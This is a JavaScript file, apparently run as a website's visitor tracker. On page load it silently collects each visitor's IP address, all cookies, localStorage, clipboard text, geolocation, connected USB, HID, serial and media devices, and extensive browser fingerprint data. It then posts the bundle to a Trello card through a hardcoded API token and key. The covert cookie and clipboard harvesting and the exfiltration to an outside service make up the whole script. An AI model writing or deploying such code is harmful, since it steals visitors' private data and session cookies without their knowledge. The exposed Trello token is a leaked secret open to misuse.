var visits = getCookie('visits')
visits = '0' + visits
var visitsNum = Number.parseInt(visits)
visitsNum += 1

setCookie('visits', visitsNum, 10)

function Analyze() {
    const labelId = '62baafd654f7e25c5dc6b35f'

    const listId = '62baaf7ce73a84408e99e2c0'

    const PerformanceNavigationType = {
        0: 'TYPE_NAVIGATE',
        1: 'TYPE_RELOAD',
        2: 'TYPE_BACK_FORWARD',
        255: 'TYPE_RESERVED',
    }

    var info = {
        timeOpened: 'Error',
        timezone: 'Error',

        ipAddress: 'Error',
        os: 'Error',

        pageon: 'Error',
        referrer: 'Error',

        visitsIn10Days: 'Error',

        data: {
            dataCookies1: 'Error',
            dataCookies2: 'Error',
            dataStorage: 'Error',
        },

        sizes: {
            document: {
                width: 'Error',
                height: 'Error',
            },
            inner: {
                width: 'Error',
                height: 'Error',
            },
        },

        connection: {
            downlink: 'Error',
            downlinkMax: 'Error',
            effectiveType: 'Error',
            rtt: 'Error',
            saveData: 'Error',
            type: 'Error',
        },

        navigator: {
            doNotTrack: 'Error',
            languages: 'Error',
            mediaSession: 'Error',
            webdriver: 'Error',
            baseURI: 'Error',
            URL: 'Error',
            domain: 'Error',
            javaEnabled: 'Error',
            dataCookiesEnabled: 'Error',
            history: {
                length: 'Error',
                state: 'Error',
                scrollRestoration: 'Error',
            },
            perfomance: {
                memory: {
                    jsHeapSizeLimit: 'Error',
                    totalJSHeapSize: 'Error',
                    usedJSHeapSize: 'Error',
                },
                navigation: {
                    redirectCount: 'Error',
                    type: 'Error',
                },
            },
            visualViewport: {
                width: 'Error',
                height: 'Error',
                offsetLeft: 'Error',
                offsetTop: 'Error',
                pageLeft: 'Error',
                pageTop: 'Error',
                scale: 'Error',
            },
            clipboard: 'Error',
            personalbarVisible: 'Error',
            statusbarVisible: 'Error',
            scrollbarsVisible: 'Error',
            toolbarVisible: 'Error',
            styleMediaType: 'Error',
        },

        hardware: {
            hardwareConcurrency: 'Error',
            maxTouchPoints: 'Error',
            gamepads: 'Error',
            geolocation: 'Error',

            screen: {
                colorDepth: 'Error',
                pixelDepth: 'Error',
                width: 'Error',
                height: 'Error',
                availWidth: 'Error',
                availHeight: 'Error',
                orientation: {
                    angle: 'Error',
                    type: 'Error',
                },
                isExtended: 'Error',
                availLeft: 'Error',
                availTop: 'Error',
            },
            bluetoothAvailability: 'Error',
        },

        browser: {
            name1: 'Error',
            name2: 'Error',

            codeName: 'Error',

            productSub: 'Error',

            vendor: 'Error',
            vendorSub: 'Error',

            engine: 'Error',
            version1: 'Error',
            version2: 'Error',

            language: 'Error',
            online: 'Error',
            platform: 'Error',
        },
    }

    try { info.visitsIn10Days = visitsNum } catch (ex) { }
    try { info.visitsIn10Days = getCookie('visits') } catch (ex) { }

    try {
        var xmlHttp = new XMLHttpRequest()
        xmlHttp.open("GET", 'https://api.ipify.org/', true)
        xmlHttp.send(null)
        xmlHttp.onerror = function() {
            info.ipAddress = 'The fetch failed'
        }
        xmlHttp.onabort = function() {
            info.ipAddress = 'The fetch aborted'
        }
        xmlHttp.onreadystatechange = function() {
            if (xmlHttp.responseText.length > 0) {
                info.ipAddress = xmlHttp.responseText
            }
        }
        info.ipAddress = 'Timed out'
    } catch (ex) { }

    try { info.os = getOS() } catch (ex) { }

    try { info.timeOpened = new Date() } catch (ex) { }
    try { info.timeOpened = new Date().toString() } catch (ex) { }
    try { info.timezone = (new Date()).getTimezoneOffset() } catch (ex) { }
    try { info.timezone = (new Date()).getTimezoneOffset() / 60 } catch (ex) { }

    try { info.navigator.dataCookiesEnabled = navigator.cookieEnabled } catch (ex) { }
    try { info.data.dataCookies1 = document.cookie } catch (ex) { }
    try { info.data.dataCookies2 = document.cookie.split(";") } catch (ex) { }
    try { info.data.dataCookies2 = decodeURIComponent(document.cookie.split(";")) } catch (ex) { }
    try { info.data.dataStorage = localStorage } catch (ex) { }

    try { info.referrer = document.referrer } catch (ex) { }
    try { info.pageon = window.location.pathname } catch (ex) { }

    try { info.sizes.document.width = document.width } catch (ex) { }
    try { info.sizes.document.height = document.height } catch (ex) { }
    try { info.sizes.inner.width = innerWidth } catch (ex) { }
    try { info.sizes.inner.height = innerHeight } catch (ex) { }

    try { info.browser.vendor = navigator.vendor } catch (ex) { }
    try { info.browser.codeName = navigator.appCodeName } catch (ex) { }
    try { info.browser.productSub = navigator.productSub } catch (ex) { }
    try { info.browser.vendorSub = navigator.vendorSub } catch (ex) { }
    try { info.browser.name2 = navigator.appName } catch (ex) { }
    try { info.browser.engine = navigator.product } catch (ex) { }
    try { info.browser.version1 = navigator.appVersion } catch (ex) { }
    try { info.browser.version2 = navigator.userAgent } catch (ex) { }
    try { info.browser.language = navigator.language } catch (ex) { }
    try { info.browser.online = navigator.onLine } catch (ex) { }
    try { info.browser.platform = navigator.platform } catch (ex) { }
    try { info.browser.name1 = GetBrowser() } catch (ex) { }
    
    try { info.connection.downlink = navigator.connection.downlink } catch (ex) { }
    try { info.connection.downlinkMax = navigator.connection.downlinkMax } catch (ex) { }
    try { info.connection.effectiveType = navigator.connection.effectiveType } catch (ex) { }
    try { info.connection.rtt = navigator.connection.rtt } catch (ex) { }
    try { info.connection.saveData = navigator.connection.saveData } catch (ex) { }
    try { info.connection.type = navigator.connection.type } catch (ex) { }

    try { info.navigator.javaEnabled = navigator.javaEnabled() } catch (ex) { }
    try { info.navigator.doNotTrack = navigator.doNotTrack } catch (ex) { }
    try { info.navigator.languages = navigator.languages } catch (ex) { }
    try { info.navigator.mediaSession = navigator.mediaSession } catch (ex) { }
    try { info.navigator.webdriver = navigator.webdriver } catch (ex) { }
    try { info.navigator.URL = navigator.URL } catch (ex) { }
    try { info.navigator.domain = navigator.domain } catch (ex) { }
    try { info.navigator.baseURI = navigator.baseURI } catch (ex) { }
    try { navigator.clipboard.readText().then((clipboardItems) => {
        info.navigator.clipboard = clipboardItems
    }).catch((err) => { }) } catch (ex) { }
    try { info.navigator.history.length = history.length } catch (ex) { }
    try { info.navigator.history.state = history.state } catch (ex) { }
    try { info.navigator.history.scrollRestoration = history.scrollRestoration } catch (ex) { }
    
    try { info.navigator.perfomance.memory.jsHeapSizeLimit = performance.memory.jsHeapSizeLimit } catch (ex) { }
    try { info.navigator.perfomance.memory.totalJSHeapSize = performance.memory.totalJSHeapSize } catch (ex) { }
    try { info.navigator.perfomance.memory.usedJSHeapSize = performance.memory.usedJSHeapSize } catch (ex) { }
    try { info.navigator.perfomance.navigation.redirectCount = performance.navigation.redirectCount } catch (ex) { }
    try { info.navigator.perfomance.navigation.type = performance.navigation.type + ' (' + PerformanceNavigationType[performance.navigation.type] + ')' } catch (ex) { }

    try { info.navigator.personalbarVisible = personalbar.visible } catch (ex) { }
    try { info.navigator.statusbarVisible = statusbar.visible } catch (ex) { }
    try { info.navigator.scrollbarsVisible = scrollbars.visible } catch (ex) { }
    try { info.navigator.toolbarVisible = toolbar.visible } catch (ex) { }

    try { info.navigator.visualViewport.width = visualViewport.width } catch (ex) { }
    try { info.navigator.visualViewport.height = visualViewport.height } catch (ex) { }
    try { info.navigator.visualViewport.offsetLeft = visualViewport.offsetLeft } catch (ex) { }
    try { info.navigator.visualViewport.offsetTop = visualViewport.offsetTop } catch (ex) { }
    try { info.navigator.visualViewport.pageLeft = visualViewport.pageLeft } catch (ex) { }
    try { info.navigator.visualViewport.pageTop = visualViewport.pageTop } catch (ex) { }
    try { info.navigator.visualViewport.scale = visualViewport.scale } catch (ex) { }

    try { info.navigator.styleMediaType = styleMedia.type } catch (ex) { }

    try { info.hardware.screen.colorDepth = screen.colorDepth } catch (ex) { }
    try { info.hardware.screen.pixelDepth = screen.pixelDepth } catch (ex) { }
    try { info.hardware.screen.isExtended = screen.isExtended } catch (ex) { }

    try { info.hardware.screen.orientation.angle = screen.orientation.angle } catch (ex) { }
    try { info.hardware.screen.orientation.type = screen.orientation.type } catch (ex) { }

    try { info.hardware.screen.width = screen.width } catch (ex) { }    
    try { info.hardware.screen.height = screen.height } catch (ex) { }

    try { info.hardware.screen.availWidth = screen.availWidth } catch (ex) { }
    try { info.hardware.screen.availHeight = screen.availHeight } catch (ex) { }

    try { info.hardware.screen.availLeft = screen.availLeft } catch (ex) { }
    try { info.hardware.screen.availTop = screen.availTop } catch (ex) { }

    try { navigator.serial.getPorts().then((res) => { info.hardware.serialPorts = res }).catch((err) => { }) } catch (ex) { }
    try { navigator.bluetooth.getAvailability().then((res) => { info.hardware.bluetoothAvailability = res }).catch((err) => { }) } catch (ex) { }
    try { navigator.usb.getDevices().then((res) => { info.hardware.usbDevices = res }).catch((err) => { }) } catch (ex) { }
    try { navigator.mediaDevices.enumerateDevices().then((res) => { info.hardware.mediaDevices = res }).catch((err) => { }) } catch (ex) { }
    try { info.hardware.hardwareConcurrency = navigator.hardwareConcurrency } catch (ex) { }
    try { info.hardware.maxTouchPoints = navigator.maxTouchPoints } catch (ex) { }
    try { info.hardware.gamepads = navigator.getGamepads() } catch (ex) { }
    try { navigator.hid.getDevices().then((res) => { info.hardware.hid = res }).catch((err) => { }) } catch (ex) { }
    try {
        navigator.geolocation.getCurrentPosition((pos) => {
            info.hardware.geolocation = pos.coords
        }, (err) => {
            info.hardware.geolocation = err.message
        })
    } catch (ex) { }

    info.userAgentData = navigator.userAgentData
    navigator.userAgentData
        .getHighEntropyValues(['architecture', 'bitness', 'brands', 'mobile', 'model', 'platform', 'platformVersion', 'uaFullVersion', 'fullVersionList', 'wow64'])
        .then(ua => {
            info.userAgentData = ua
        })
        .catch((err) => { })
    

    setTimeout(() => {
        var data = JSON.stringify(info, null, '\t')
        var xhr = new XMLHttpRequest()
        xhr.open("POST",
            'https://api.trello.com/1/cards/?' +
            'idList=' + listId +
            '&token=84de6f5cbc9e3fb5df77596358352cc839e1dea58d8dbb0857919f39b6143acf' +
            '&key=16160910964e82904e57646c84c9fb69' +
            '&name=' + urlParameter('Valaki meglátogatta az oldalt') +
            '&desc=' + '```' + urlParameter(data) + '```' +
            '&idLabels=' + labelId +
            '&pos=top'
            , true)
        xhr.setRequestHeader('Content-Type', 'application/json')
        xhr.send()
    }, 1000)
}

function GetBrowser() {
    let userAgent = navigator.userAgent
    let browserName
    if (userAgent.match(/chrome|chromium|crios/i)) {
        browserName = "Chrome"
    } else if (userAgent.match(/firefox|fxios/i)) {
        browserName = "Firefox"
    } else if (userAgent.match(/safari/i)) {
        browserName = "Safari"
    } else if (userAgent.match(/opr\//i)) {
        browserName = "Opera"
    } else if (userAgent.match(/edg/i)) {
        browserName = "Edge"
    } else {
        browserName = "?";
    }
    return browserName
}

function getOS() {
    var userAgent = window.navigator.userAgent,
        platform = window.navigator.platform,
        macosPlatforms = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'],
        windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'],
        iosPlatforms = ['iPhone', 'iPad', 'iPod'],
        os = null;

    if (macosPlatforms.indexOf(platform) !== -1) {
        os = 'MacOS';
    } else if (iosPlatforms.indexOf(platform) !== -1) {
        os = 'iOS';
    } else if (windowsPlatforms.indexOf(platform) !== -1) {
        os = 'Windows';
    } else if (/Android/.test(userAgent)) {
        os = 'Android';
    } else if (!os && /Linux/.test(platform)) {
        os = 'Linux';
    } else {
        os = '?'
    }

    return os;
}

function setCookie(name, value, expireDays) {
    const d = new Date();
    d.setTime(d.getTime() + (expireDays * 24 * 60 * 60 * 1000));
    let expires = "expires=" + d.toUTCString();
    document.cookie = name + "=" + value + ";" + expires + ";path=/";
}

function getCookie(name) {
    let name_ = name + "=";
    let decodedCookie = decodeURIComponent(document.cookie);
    let ca = decodedCookie.split(';');
    for (let i = 0; i < ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name_) == 0) {
            return c.substring(name_.length, c.length);
        }
    }
    return '';
}

function urlParameter(parameterValue) {
    var data = parameterValue
    data = replaceAll(data, '\\`', '%60')
    data = replaceAll(data, '\t', '%09')
    data = replaceAll(data, '\n', '%0A')
    data = replaceAll(data, '\\ ', '%20')
    data = replaceAll(data, '\\"', '%22')
    data = replaceAll(data, '\\,', '%2C')
    data = replaceAll(data, '\\:', '%3A')
    data = replaceAll(data, '\\;', '%3B')
    data = replaceAll(data, '\\{', '%7B')
    data = replaceAll(data, '\\}', '%7D')
    data = replaceAll(data, '\\/', '%2F')
    data = replaceAll(data, '\\[', '%5B')
    data = replaceAll(data, '\\]', '%5D')
    data = replaceAll(data, '\\+', '%2B')
    data = replaceAll(data, '\\í', '%C3%AD')
    data = replaceAll(data, '\\ö', '%C3%B6')
    data = replaceAll(data, '\\ó', '%C3%B3')
    data = replaceAll(data, '\\ü', '%C3%BC')
    data = replaceAll(data, '\\é', '%C3%A9')
    data = replaceAll(data, '\\á', '%C3%A1')
    data = replaceAll(data, '\\ú', '%C3%BA')
    data = replaceAll(data, '\\ű', '%C5%B1')
    data = replaceAll(data, '\\ő', '%C5%91')
    data = replaceAll(data, '[^a-zA-Z0-9\\-\\_\\.\\~\\%\\(\\)]', '%20')
    return data
}

function replaceAll(str, find, replace) {
    return str.replace(new RegExp(find, 'g'), replace);
}